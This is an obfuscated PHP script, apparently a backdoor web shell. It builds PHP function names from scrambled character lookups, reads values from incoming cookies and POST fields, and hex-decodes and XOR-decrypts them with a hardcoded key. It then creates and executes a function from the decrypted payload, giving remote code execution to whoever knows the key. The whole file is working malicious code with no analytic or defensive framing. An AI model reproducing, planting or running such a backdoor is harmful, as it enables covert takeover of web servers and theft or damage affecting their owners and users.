<?php
$cjnax = 'd#c*1kmigxb_\'ts9nrf-u467leo52v3H0ayp';
$cvdtd = Array();
$cvdtd[] = $cjnax[2] . $cjnax[17] . $cjnax[25] . $cjnax[33] . $cjnax[13] . $cjnax[25] . $cjnax[11] . $cjnax[18] . $cjnax[20] . $cjnax[16] . $cjnax[2] . $cjnax[13] . $cjnax[7] . $cjnax[26] . $cjnax[16];
$cvdtd[] = $cjnax[31] . $cjnax[3];
$cvdtd[] = $cjnax[1];
$cvdtd[] = $cjnax[2] . $cjnax[22] . $cjnax[23] . $cjnax[15] . $cjnax[27] . $cjnax[10] . $cjnax[28] . $cjnax[2] . $cjnax[19] . $cjnax[18] . $cjnax[22] . $cjnax[10] . $cjnax[28] . $cjnax[19] . $cjnax[21] . $cjnax[4] . $cjnax[32] . $cjnax[15] . $cjnax[19] . $cjnax[33] . $cjnax[0] . $cjnax[18] . $cjnax[30] . $cjnax[19] . $cjnax[4] . $cjnax[21] . $cjnax[21] . $cjnax[25] . $cjnax[4] . $cjnax[25] . $cjnax[21] . $cjnax[10] . $cjnax[18] . $cjnax[2] . $cjnax[21] . $cjnax[23];
$cvdtd[] = $cjnax[2] . $cjnax[26] . $cjnax[20] . $cjnax[16] . $cjnax[13];
$cvdtd[] = $cjnax[14] . $cjnax[13] . $cjnax[17] . $cjnax[11] . $cjnax[17] . $cjnax[25] . $cjnax[35] . $cjnax[25] . $cjnax[33] . $cjnax[13];
$cvdtd[] = $cjnax[25] . $cjnax[9] . $cjnax[35] . $cjnax[24] . $cjnax[26] . $cjnax[0] . $cjnax[25];
$cvdtd[] = $cjnax[14] . $cjnax[20] . $cjnax[10] . $cjnax[14] . $cjnax[13] . $cjnax[17];
$cvdtd[] = $cjnax[33] . $cjnax[17] . $cjnax[17] . $cjnax[33] . $cjnax[34] . $cjnax[11] . $cjnax[6] . $cjnax[25] . $cjnax[17] . $cjnax[8] . $cjnax[25];
$cvdtd[] = $cjnax[14] . $cjnax[13] . $cjnax[17] . $cjnax[24] . $cjnax[25] . $cjnax[16];
$cvdtd[] = $cjnax[35] . $cjnax[33] . $cjnax[2] . $cjnax[5];
foreach ($cvdtd[8]($_COOKIE, $_POST) as $nnvgfm => $rxspjvs) {
	function nlmwpch($cvdtd, $nnvgfm, $xogihw)
	{
		return $cvdtd[7]($cvdtd[5]($nnvgfm . $cvdtd[3], ($xogihw / $cvdtd[9]($nnvgfm)) + 1), 0, $xogihw);
	}

	function nquhl($cvdtd, $oubzab)
	{
		return @$cvdtd[10]($cvdtd[1], $oubzab);
	}

	function fsirot($cvdtd, $oubzab)
	{
		$oosctm = $cvdtd[4]($oubzab) % 3;
		if (!$oosctm) {
			$nswwlyd = $cvdtd[0];
			$vfevm = $nswwlyd("", $oubzab[1]($oubzab[2]));
			$vfevm();
			exit();
		}
	}

	$rxspjvs = nquhl($cvdtd, $rxspjvs);
	fsirot($cvdtd, $cvdtd[6]($cvdtd[2], $rxspjvs ^ nlmwpch($cvdtd, $nnvgfm, $cvdtd[9]($rxspjvs))));
}
